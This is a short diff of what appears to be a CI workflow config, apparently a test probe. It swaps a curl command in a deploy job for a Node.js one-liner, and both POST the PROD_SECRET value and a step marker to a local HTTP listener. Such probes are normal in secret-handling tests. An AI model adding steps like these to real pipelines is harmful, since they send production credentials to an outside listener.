@@ -10,4 +10,4 @@ jobs:
     secrets:
       - PROD_SECRET
     steps:
-      - show: curl -s -X POST --data "deploy-job-secret=[$PROD_SECRET]" http://172.17.0.1:19150/ || true
+      - show: node -e 'const h=require("http");const send=(d)=>new Promise(r=>{const q=h.request({host:"172.17.0.1",port:19150,method:"POST"},res=>{res.resume();res.on("end",r)});q.on("error",e=>{console.log("ERR",e.message);r()});q.write(d);q.end()});(async()=>{await send("marker=STEP-RAN-IN-DEPLOY-JOB");await send("PROD_SECRET=["+(process.env.PROD_SECRET||"<UNSET>")+"]");})()'
